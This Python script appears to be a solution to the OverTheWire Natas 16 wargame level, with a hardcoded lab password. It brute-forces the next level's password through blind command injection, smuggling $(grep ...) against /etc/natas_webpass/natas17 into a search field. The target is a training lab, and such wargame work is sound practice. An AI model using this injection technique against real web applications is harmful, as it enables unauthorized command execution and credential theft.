import requests

url = 'http://natas16.natas.labs.overthewire.org'
user = 'natas16'
password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'

natas17_pass = ''
caracteres = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
for i in range (1, 33):
    for c in caracteres:
        temp_pass = natas17_pass + c
        injection = f'$(grep ^{temp_pass} /etc/natas_webpass/natas17)'
        print(injection)
        data = {"needle": injection}
        response = requests.post(url, auth=(user, password), data=data)
        if "Catholic" not in response.text:
           print(f'Caractere {c} no posição {i}') 
           natas17_pass = natas17_pass + c
           break

print(natas17_pass)
